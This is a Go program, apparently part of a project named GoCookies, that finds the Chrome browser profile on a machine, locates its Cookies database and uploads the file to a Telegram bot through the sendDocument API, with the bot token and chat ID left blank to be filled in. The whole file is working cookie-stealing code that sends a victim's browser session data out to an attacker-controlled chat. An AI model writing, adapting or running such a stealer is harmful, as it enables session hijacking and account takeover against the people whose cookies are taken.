package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"GoCookies/browsers"
)

const (
	botToken = "" // Replace with your Telegram bot token
	chatID   = "" // Replace with your Telegram chat ID
)

func main() {
	// Get the available Chromium-based browsers and their paths
	browsersMap := browsers.GetChromiumBrowsers()

	// Assuming you want to use Chrome; you can modify to choose another browser
	chromeProfilePath := browsersMap["Chrome"]
	if chromeProfilePath == "" {
		log.Fatalf("Chrome profile path not found in the map")
	}

	// Define the path to the Chromium Cookies file
	cookiesFilePath := filepath.Join(chromeProfilePath, "Network", "Cookies")

	// Check if the cookie file exists
	if _, err := os.Stat(cookiesFilePath); os.IsNotExist(err) {
		log.Fatalf("Cookies file does not exist at path: %s", cookiesFilePath)
	}

	log.Printf("Found cookies file at: %s", cookiesFilePath)

	// Send the cookies file to Telegram
	err := sendFileToTelegram(cookiesFilePath)
	if err != nil {
		log.Fatalf("Failed to send cookies file to Telegram: %v", err)
	}

	fmt.Println("Cookies file sent successfully!")
}

// sendFileToTelegram uploads the cookies file to Telegram
func sendFileToTelegram(filePath string) error {
	telegramURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	// Open the cookie file
	fileContent, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer fileContent.Close()

	// Create the multipart form data
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add the chat_id field
	if err := writer.WriteField("chat_id", chatID); err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	// Add the file field
	fileField, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create file field: %v", err)
	}

	// Copy the file content to the form field
	if _, err := io.Copy(fileField, fileContent); err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	writer.Close()

	// Send the POST request
	req, err := http.NewRequest("POST", telegramURL, body)
	if err != nil {
		return fmt.Errorf("failed to create HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send HTTP request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		// Read the response body to log the error
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to send document: %s, Response: %s", resp.Status, string(respBody))
	}

	log.Printf("File sent successfully with status: %s", resp.Status)
	return nil
}
